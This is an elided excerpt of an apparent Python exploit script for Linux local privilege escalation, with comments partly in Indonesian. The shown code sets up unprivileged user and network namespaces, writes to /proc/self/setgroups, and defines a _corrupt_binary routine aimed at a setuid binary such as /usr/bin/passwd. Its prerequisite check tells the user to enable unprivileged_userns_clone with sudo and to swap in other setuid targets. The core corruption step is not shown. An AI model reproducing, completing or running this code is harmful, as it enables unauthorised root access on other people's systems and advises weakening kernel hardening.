...
Fixed: /proc/self/setgroups permission error handling
"""
...
def _setup_userns():
    ...
    # Cek apakah unprivileged user namespace didukung
    try:
        sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
    except OSError as e:
        WARN("unshare failed: %s", e)
        WARN("Kernel mungkin tidak mendukung unprivileged user namespace")
        WARN("Coba jalankan sebagai root atau enable: echo 1 > /proc/sys/kernel/unprivileged_userns_clone")
        return False
    
    # Handle setgroups - ignore if fails (older kernel)
    try:
        with open("/proc/self/setgroups", 'w') as f:
            f.write("deny")
    except (PermissionError, FileNotFoundError, OSError) as e:
        DBG("setgroups write failed (optional): %s", e)
        # Pada kernel lawas, file ini tidak ada, lanjutkan saja
...
def _corrupt_binary():
    if not _setup_userns():
        WARN("Failed to set up user namespace")
        return False
    time.sleep(0.1)
...
def check_prerequisites():
    ...
    try:
        with open("/proc/sys/kernel/unprivileged_userns_clone", "r") as f:
            ...
            if not enabled:
                WARN("unprivileged_userns_clone is disabled")
                WARN("Try: echo 1 | sudo tee /proc/sys/kernel/unprivileged_userns_clone")
                return False
    except FileNotFoundError:
        # Older kernel without this file - might still work
        pass
    
    # Check if /usr/bin/passwd is readable
    if not os.access(TARGET_SU, os.R_OK):
        WARN("%s is not readable", TARGET_SU)
        WARN("Try changing TARGET_SU to /bin/passwd or another setuid binary")
        return False
